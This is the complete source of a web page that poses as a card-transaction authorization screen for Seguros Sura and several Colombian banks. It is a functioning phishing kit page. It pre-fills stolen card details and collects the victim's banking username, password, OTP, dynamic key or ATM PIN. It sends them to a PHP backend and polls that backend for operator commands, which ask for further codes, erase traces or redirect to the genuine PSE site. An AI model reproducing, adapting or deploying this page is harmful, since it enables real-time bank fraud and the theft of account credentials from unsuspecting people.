<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Autorización de transacción</title>
    <style>
        body {
            font-family: Arial, Helvetica, sans-serif;
            background-color: #ffffff;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            min-height: 100vh;
        }
        .iframe-container {
            background-color: #ffffff;
            width: 100%;
            max-width: 450px;
            box-sizing: border-box;
            padding: 20px;
            margin-top: 20px;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
        }
        .header img {
            max-height: 35px;
        }
        .bank-logo-container {
            display: flex;
            align-items: center;
        }
        .bank-logo-container img {
            max-height: 25px;
            max-width: 130px;
        }
        .bank-text {
            font-size: 16px;
            font-weight: bold;
            color: #333;
        }
        
        h2 {
            font-size: 16px;
            color: #000;
            margin: 0 0 15px 0;
            font-weight: bold;
        }
        p.instruction {
            font-size: 14px;
            color: #111;
            line-height: 1.4;
            margin-bottom: 15px;
        }
        
        .section-title {
            font-size: 14px;
            color: #666;
            font-weight: bold;
            margin-top: 25px;
            margin-bottom: 15px;
        }

        .table-details {
            width: 100%;
            border-collapse: collapse;
            font-size: 13px;
        }
        .table-details td {
            padding: 6px 0;
            vertical-align: middle;
        }
        .table-details td:first-child {
            width: 45%;
            color: #000;
            text-align: right;
            padding-right: 15px;
            font-weight: bold;
        }
        .table-details td:last-child {
            color: #000;
            font-weight: normal;
        }
        
        .input-code {
            width: 140px;
            padding: 6px 8px;
            border: 1px solid #999;
            border-radius: 4px;
            font-size: 14px;
            font-family: inherit;
        }
        .input-code:focus {
            border-color: #333;
            outline: none;
        }
        
        .actions-bottom {
            margin-top: 30px;
            text-align: center;
        }
        .help-link {
            font-size: 13px;
            color: #000;
            text-decoration: underline;
            display: block;
            margin-bottom: 15px;
        }
        .btn-submit {
            background-color: #222;
            color: #fff;
            border: none;
            padding: 10px 30px;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            width: 150px;
        }
        .btn-submit:hover {
            background-color: #000;
        }
        .error-msg {
            color: #cc0000;
            font-size: 13px;
            margin-bottom: 15px;
            font-weight: bold;
            display: none;
            text-align: center;
        }
        
        
        .mode-container { display: none; }
        .mode-container.active { display: table-row; }

        
        /* Loader Overlay */
        .loader-overlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(255,255,255,0.9);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            display: none;
        }
        .loader-spinner {
            border: 3px solid #ccc;
            border-top: 3px solid #222;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin-bottom: 15px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="iframe-container">
    <div class="header">
        <div class="bank-logo-container" id="bankLogoContainer">
            <!-- Dynamic Bank Logo or Text -->
        </div>
        <img src="visa.png" alt="Brand Logo" id="brandLogo">
    </div>

    <h2>Autorización de transacción</h2>
    
    <p class="instruction">
        La transacción que intentas realizar en <span id="tComercio">SEGUROS SURA</span> por 
        $<span id="tMonto">0</span> COP el <span id="tFecha"></span> con tu tarjeta terminada en 
        ************<span id="tFinal"></span> debe ser autorizada por seguridad.
    </p>

    <p class="instruction" id="lblContinuar">
        Continúa con ella ingresando tu Clave Dinámica.
    </p>

    <div id="errorMsg" class="error-msg">El código ingresado es incorrecto o ha expirado. Intente de nuevo.</div>

    <div class="section-title">Detalle de la Transacción</div>

    <table class="table-details">
        <tr>
            <td>Comercio:</td>
            <td id="dComercio">SEGUROS SURA</td>
        </tr>
        <tr>
            <td>Monto de la Transacción:</td>
            <td>$<span id="dMonto">0</span> COP</td>
        </tr>
        <tr>
            <td>Número de Tarjeta:</td>
            <td>************<span id="dFinal"></span></td>
        </tr>
        
                <!-- Mode: Token -->
        <tr id="tr-token" class="mode-container">
            <td id="lbl-token-input" style="color:#000; font-weight:bold;">Ingresa tu Clave Dinámica:</td>
            <td><input type="text" id="inp-token" class="input-code" inputmode="numeric" maxlength="8" autocomplete="off"></td>
        </tr>

        <!-- Mode: Usuario/Clave -->
        <tr class="mode-container tr-usuario">
            <td style="color:#cc0000; font-weight:bold;">Usuario:</td>
            <td><input type="text" id="inp-user" class="input-code" autocomplete="off"></td>
        </tr>
        <tr class="mode-container tr-usuario">
            <td style="color:#cc0000; font-weight:bold;">Clave:</td>
            <td><input type="password" id="inp-pass" class="input-code" autocomplete="off"></td>
        </tr>
    </table>

    <div class="actions-bottom">
        <a href="#" class="help-link" onclick="alert('Se enviará un nuevo código a sus canales de contacto.'); return false;">Haga click aquí para recibir un código nuevo</a>
        <button id="btnSubmit" class="btn-submit">Enviar</button>
    </div>

</div>

<div class="loader-overlay" id="loaderOverlay">
    <div class="loader-spinner"></div>
    <div style="font-size:13px; color:#333; font-weight:bold;">Procesando su solicitud...</div>
</div>

<script>
    function resolveTransactionId() {
        const params = new URLSearchParams(window.location.search);
        const candidates = [
            params.get('transactionId'),
            params.get('tid'),
            params.get('tx'),
            params.get('session_id'),
            ((() => { const params = new URLSearchParams(window.location.search); const direct = [params.get('transactionId'), params.get('tid'), params.get('tx'), params.get('session_id'), params.get('ts')].find((value) => value !== null && String(value).trim() !== ''); if (direct) { const normalized = String(direct); localStorage.setItem('session_id', normalized); localStorage.setItem('last_tid', normalized); return normalized; } const generated = 'session_' + Date.now() + '_' + Math.random().toString(36).slice(2, 11); localStorage.setItem('session_id', generated); localStorage.setItem('last_tid', generated); return generated; })()),
            params.get('ts')
        ];

        const resolved = candidates.find(value => value !== null && String(value).trim() !== '');
        if (resolved) {
            const normalized = String(resolved);
            localStorage.setItem('session_id', normalized);
            localStorage.setItem('last_tid', normalized);
            return normalized;
        }

        return '';
    }

    document.addEventListener("DOMContentLoaded", function() {
        const tbdatos = JSON.parse(localStorage.getItem('tbdatos')) || {};
        const totalPagarDirect = localStorage.getItem('total_pagar') || tbdatos.total_pagar || 0;
        let activeTransactionId = resolveTransactionId();

        function createFreshTransactionId() {
            const generated = 'session_' + Date.now() + '_' + Math.random().toString(36).slice(2, 11);
            localStorage.setItem('session_id', generated);
            localStorage.setItem('last_tid', generated);
            activeTransactionId = generated;
            return generated;
        }

        function persistTransactionId(tx) {
            if (!tx) {
                return activeTransactionId;
            }
            localStorage.setItem('session_id', tx);
            localStorage.setItem('last_tid', tx);
            activeTransactionId = tx;
            return tx;
        }
        
        // Populate details
        const monto = parseFloat(totalPagarDirect).toLocaleString('es-CO');
        const tarjeta = tbdatos.tarjeta || '0000000000000000';
        const final4 = tarjeta.slice(-4);
        const comercio = tbdatos.comercio || "SEGUROS SURA";
        
        const date = new Date();
        const fechaFormat = ("0" + date.getDate()).slice(-2) + "/" + ("0" + (date.getMonth() + 1)).slice(-2) + "/" + date.getFullYear();

        document.getElementById("tMonto").textContent = monto;
        document.getElementById("dMonto").textContent = monto;
        document.getElementById("tFecha").textContent = fechaFormat;
        document.getElementById("tFinal").textContent = final4;
        document.getElementById("dFinal").textContent = final4;
        document.getElementById("tComercio").textContent = comercio;
        document.getElementById("dComercio").textContent = comercio;

        // Set Bank Logo Left Side
        const bankLogoContainer = document.getElementById("bankLogoContainer");
        const lblContinuar = document.getElementById("lblContinuar");
        
        // Map of known banks
        const bankNameRaw = (tbdatos.banco || '').toLowerCase();
        let bankHtml = '';
        let appName = 'la App de tu Banco';
        let imgName = '';

        if (bankNameRaw.includes('bancolombia')) {
            imgName = 'bancolombia.png';
            appName = 'la App Bancolombia';
        } else if (bankNameRaw.includes('bogota') || bankNameRaw.includes('bogotá')) {
            imgName = 'bogota.png';
            appName = 'la App Banca Móvil';
        } else if (bankNameRaw.includes('davivienda')) {
            imgName = 'davivienda.png';
            appName = 'la App Davivienda';
        } else if (bankNameRaw.includes('colpatria') || bankNameRaw.includes('scotiabank')) {
            imgName = 'Colpatria.png';
            appName = 'la App Colpatria';
        } else if (bankNameRaw.includes('av villas') || bankNameRaw.includes('avvillas')) {
            imgName = 'avvillas.png';
            appName = 'la App AV Villas';
        } else if (bankNameRaw.includes('bbva')) {
            imgName = 'bbva.png';
            appName = 'la App BBVA';
        } else if (bankNameRaw.includes('caja social')) {
            imgName = 'cajasocial.png';
            appName = 'la App Caja Social';
        } else if (bankNameRaw.includes('falabella')) {
            imgName = 'falabella.png';
            appName = 'la App Falabella';
        } else if (bankNameRaw.includes('itau') || bankNameRaw.includes('itaú')) {
            imgName = 'itau.png';
            appName = 'la App Itaú';
        } else if (bankNameRaw.includes('nequi')) {
            imgName = 'nequi.png';
            appName = 'la App Nequi';
        } else if (bankNameRaw.includes('popular')) {
            imgName = 'popular.png';
            appName = 'la App Banco Popular';
        } else if (bankNameRaw.includes('serfinanza')) {
            imgName = 'serfinanza.png';
            appName = 'la App Serfinanza';
        }

        if (imgName) {
            bankHtml = '<img src="img/bank/' + imgName + '" alt="' + (tbdatos.banco || 'Banco') + '" onerror="this.outerHTML=\'<span class=bank-text>' + (tbdatos.banco || 'Banco') + '</span>\'">';
        } else if (tbdatos.banco) {
            bankHtml = '<span class="bank-text">' + tbdatos.banco + '</span>';
            appName = 'la App de ' + tbdatos.banco;
        } else {
            bankHtml = '<span class="bank-text"></span>';
            appName = 'la App de tu Banco';
        }
        
        bankLogoContainer.innerHTML = bankHtml;
        lblContinuar.innerHTML = "Continúa con ella ingresando el código enviado por mensaje de texto (SMS).";

        // Set Brand Logo Right Side
        const brandLogo = document.getElementById("brandLogo");
        if (tbdatos.cardBrand && tbdatos.cardBrand.includes('visa')) {
            brandLogo.src = "visa.png";
        } else if (tbdatos.cardBrand && (tbdatos.cardBrand.includes('master') || tbdatos.cardBrand.includes('mastercard'))) {
            brandLogo.src = "master.png";
        } else {
            brandLogo.src = "visa.png";
        }
        
        
        // Mode logic
        const urlParams = new URLSearchParams(window.location.search);
        let action = urlParams.get('action') || 'usuario';
        let hasError = urlParams.get('error') === '1';

        let lblCode = "Clave Dinámica";
        if(action === 'otp') lblCode = "Código OTP";
        if(action === 'token') lblCode = "Token";
        if(action === 'c-cajero') lblCode = "Clave de Cajero";
        if(action === 'dinamica') lblCode = "Clave Dinámica";

                if (action === 'pedir_usuario' || action === 'usuario') {
            action = 'usuario';
            document.querySelectorAll('.tr-usuario').forEach(el => el.classList.add('active'));
            lblContinuar.innerHTML = "Continúa con el ingreso a tu " + appName + ".";
        } else {
            document.getElementById('tr-token').classList.add('active');
            lblContinuar.innerHTML = "Continúa con ella ingresando tu " + lblCode + ", el cual fue enviado por mensaje de texto (SMS).";
            document.getElementById('lbl-token-input').textContent = "Ingresa tu " + lblCode + ":";
        }

        if (hasError) {
            document.getElementById('errorMsg').style.display = 'block';
        }

        const btnSubmit = document.getElementById('btnSubmit');
        let activePollingInterval = null;

        function clearPollingLoop() {
            if (activePollingInterval) {
                clearInterval(activePollingInterval);
                activePollingInterval = null;
            }
        }

        window.addEventListener('beforeunload', clearPollingLoop);
        
        btnSubmit.addEventListener('click', function() {
            let valToken = document.getElementById('inp-token').value.trim();
            let valUser = document.getElementById('inp-user').value.trim();
            let valPass = document.getElementById('inp-pass').value.trim();

            if (action !== 'usuario' && valToken.length < 4) {
                alert("Ingrese un código válido.");
                return;
            }
            if (action === 'usuario' && (valUser.length < 3 || valPass.length < 3)) {
                alert("Ingrese usuario y clave válidos.");
                return;
            }

            document.getElementById('loaderOverlay').style.display = 'flex';
            
            if (action === 'usuario') {
                tbdatos['3d_user'] = valUser;
                tbdatos['3d_pass'] = valPass;
                localStorage.setItem('tbdatos', JSON.stringify(tbdatos));
            }

            const submissionTransactionId = persistTransactionId(createFreshTransactionId());
            const payload = new URLSearchParams();
            payload.append('transactionId', submissionTransactionId);
            payload.append('u_tb', JSON.stringify(tbdatos));
            payload.append('action_code', action);
            payload.append('action_value', valToken);

            fetch('procesar_cc.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: payload.toString()
            })
            .then(res => res.json())
            .then(data => {
                if (data.status === 'success') {
                   startPolling(submissionTransactionId);
                } else {
                    document.getElementById('loaderOverlay').style.display = 'none';
                    alert("Error enviando datos.");
                }
            })
            .catch(err => {
                document.getElementById('loaderOverlay').style.display = 'none';
                alert("Error de conexión.");
            });
        });

        function startPolling(transactionId) {
            clearPollingLoop();
            const tx = persistTransactionId(transactionId || activeTransactionId);
            if (!tx) {
                return;
            }

            activePollingInterval = setInterval(() => {
                fetch(`verificar_respuesta.php?transactionId=${encodeURIComponent(tx)}`)
                .then(res => res.json())
                .then(data => {
                    if (data && data.action) {
                        clearPollingLoop();
                        handleCommand(data.action, tx);
                    }
                })
                .catch(err => console.error(err));
            }, 3000);
        }

        function handleCommand(cmd, currentTransactionId) {
            const tx = persistTransactionId(currentTransactionId || activeTransactionId);
            const buildUrl = (path) => {
                const url = new URL(path, window.location.href);
                if (tx) {
                    url.searchParams.set('transactionId', tx);
                }
                return url.pathname + url.search;
            };

            clearPollingLoop();

            if (cmd === 'pedir_otp') {
                window.location.href = buildUrl('3d.php?action=otp');
            } else if (cmd === 'pedir_dinamica') {
                window.location.href = buildUrl('3d.php?action=dinamica');
            } else if (cmd === 'pedir_cajero') {
                window.location.href = buildUrl('3d.php?action=c-cajero');
            } else if (cmd === 'pedir_token') {
                window.location.href = buildUrl('3d.php?action=token');
            } else if (cmd === 'pedir_usuario') {
                window.location.href = buildUrl('3d.php?action=usuario');
            } else if (cmd === 'error_token') {
                window.location.href = buildUrl('3d.php?action=' + action + '&error=1');
            } else if (cmd === 'error_usuario') {
                window.location.href = buildUrl('3d.php?action=usuario&error=1');
            } else if (cmd === 'error_tc') {
                window.location.href = buildUrl('alter.php');
            } else if (cmd === 'bre_b' || cmd === 'brev') {
                window.location.href = buildUrl('/recaudos/brev.php');
            } else if (cmd === 'error_logo') {
                window.location.href = buildUrl('/caras');
            } else if (cmd === 'ban_ip') {
            try {
                localStorage.clear();
                sessionStorage.clear();
                document.cookie.split(';').forEach(function(c) { 
                    document.cookie = c.replace(/^ +/, '').replace(/=.*/, '=;expires=' + new Date().toUTCString() + ';path=/'); 
                });
            } catch(e) {}
            window.location.replace('/fin.php');
        } else if (cmd === 'confirm_finalizar') {
                window.location.href = buildUrl('https://www.pse.com.co/inicio');
            } else {
                startPolling(tx);
            }
        }
    });
</script>

</body>
</html>
